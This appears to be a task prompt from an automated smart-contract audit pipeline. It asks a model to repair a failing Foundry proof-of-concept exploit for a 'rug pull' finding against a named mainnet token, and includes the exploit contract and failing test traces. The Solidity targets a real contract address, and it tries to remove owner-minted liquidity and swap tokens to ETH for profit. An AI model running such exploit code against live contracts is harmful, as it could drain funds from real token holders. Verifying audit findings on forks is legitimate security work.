You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initial LP tokens are minted to the owner, enabling an unrestricted liquidity rug pull
- claim: When `openTrading()` adds the initial Uniswap liquidity, it passes `owner()` as the LP recipient, so the resulting LP tokens are fully controlled by the owner rather than burned or locked.
- impact: The owner can remove the pool liquidity at any time, withdraw the paired ETH and token-side liquidity, and collapse the market. Holders are left with effectively untradeable tokens and little or no recoverable value.
- exploit_paths: ["Owner transfers tokens and ETH into the token contract, then calls `openTrading()`.", "`addLiquidityETH(..., owner(), ...)` mints the LP position directly to the owner-controlled address.", "The owner later removes liquidity off-contract and drains the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGrokToken is IERC20Minimal {
    function owner() external view returns (address);
    function openTrading() external;
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

contract FlawVerifier {
    address public constant TARGET = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant ETH_SENTINEL = address(0);

    uint256 private _profitAmount;
    string public infeasibilityReason;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return ETH_SENTINEL;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        infeasibilityReason = "";

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(ROUTER);
        address ownerAddress = token.owner();
        address pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
        uint256 ethBefore = address(this).balance;

        // Path stage 1: the owner must first seed the token contract with GROK and ETH.
        // Path stage 2: when openTrading() runs, the target's own code executes:
        // uniswapV2Router.addLiquidityETH(..., owner(), ...), so the initial LP is minted
        // directly to the owner-controlled address instead of being locked or burned.
        if (ownerAddress != address(this)) {
            if (pair == address(0)) {
                infeasibilityReason =
                    "infeasible at this fork: openTrading() is onlyOwner and the verifier is not the target owner, so the initial owner-minted LP path cannot be executed";
            } else {
                uint256 ownerLp = IERC20Minimal(pair).balanceOf(ownerAddress);
                if (ownerLp == 0) {
                    infeasibilityReason =
                        "infeasible at this fork: no owner-held LP is available to realize the claimed rug-pull path";
                } else {
                    uint256 verifierLp = IERC20Minimal(pair).balanceOf(address(this));
                    if (verifierLp == 0) {
                        infeasibilityReason =
                            "infeasible at this fork: LP was minted to owner(), but the verifier neither controls owner() nor holds the LP tokens needed for the liquidity-removal stage";
                    } else {
                        _removeLiquidityAndRealizeETH(pair, verifierLp, ethBefore, router);
                    }
                }
            }
            return;
        }

        if (pair == address(0)) {
            pair = _seedThenOpenTrading(token, router);
            if (pair == address(0)) {
                if (bytes(infeasibilityReason).length == 0) {
                    infeasibilityReason = "pair was not created after openTrading()";
                }
                return;
            }
        }

        // Path stage 2 is now concrete on this branch: because owner() == address(this),
        // the target's addLiquidityETH(..., owner(), ...) call necessarily mints LP here.
        uint256 lpBalance = IERC20Minimal(pair).balanceOf(ownerAddress);
        if (lpBalance == 0) {
            infeasibilityReason =
                "infeasible at this fork: verifier does not hold the owner-minted LP position required to remove liquidity";
            return;
        }

        _removeLiquidityAndRealizeETH(pair, lpBalance, ethBefore, router);
    }

    function _seedThenOpenTrading(
        IGrokToken token,
        IUniswapV2Router02Minimal router
    ) internal returns (address pair) {
        uint256 tokenSeed = token.balanceOf(address(this));
        uint256 ethSeed = address(this).balance;

        // Keep the finding's causality unchanged: use verifier-held assets first, and only
        // execute the owner seed -> openTrading path if the verifier already controls both sides.
        if (tokenSeed == 0 || ethSeed == 0) {
            infeasibilityReason =
                "infeasible at this fork: owner-controlled verifier lacks the GROK and/or ETH required to seed the token contract before openTrading()";
            return address(0);
        }

        require(token.transfer(TARGET, tokenSeed), "seed token transfer failed");
        (bool sent,) = payable(TARGET).call{value: ethSeed}("");
        require(sent, "seed ETH transfer failed");

        // This calls the target's public owner-only entrypoint. In the verified on-chain source,
        // openTrading() internally performs addLiquidityETH(..., owner(), ...), which is the
        // exact root cause for the owner-controlled LP mint described by the finding.
        token.openTrading();
        pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
    }

    function _removeLiquidityAndRealizeETH(
        address pair,
        uint256 lpBalance,
        uint256 ethBefore,
        IUniswapV2Router02Minimal router
    ) internal {
        IERC20Minimal(pair).approve(ROUTER, lpBalance);

        // Path stage 3: the owner-controlled LP position is removed, withdrawing the pool ETH.
        router.removeLiquidityETHSupportingFeeOnTransferTokens(
            TARGET,
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );

        uint256 residualTokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        if (residualTokenBalance != 0) {
            IERC20Minimal(TARGET).approve(ROUTER, residualTokenBalance);
            address[] memory path = new address[](2);
            path[0] = TARGET;
            path[1] = router.WETH();

            // Optional realization step: if any post-burn GROK remains and the pair still has
            // enough liquidity, swap it to ETH. This does not change the exploit causality;
            // it only realizes the owner-controlled withdrawal into the configured profit token.
            try router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                residualTokenBalance,
                0,
                path,
                address(this),
                block.timestamp
            ) {} catch {}
        }

        uint256 ethAfter = address(this).balance;
        if (ethAfter > ethBefore) {
            _profitAmount = ethAfter - ethBefore;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.74s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 183165)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [183165] FlawVerifierTest::testExploit()
    ├─ [196] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [158904] FlawVerifier::executeOnOpportunity()
    │   ├─ [2366] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 1000
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [196] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [321] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.87s (684.70ms CPU time)

Ran 1 test suite in 3.88s (3.87s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 183165)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
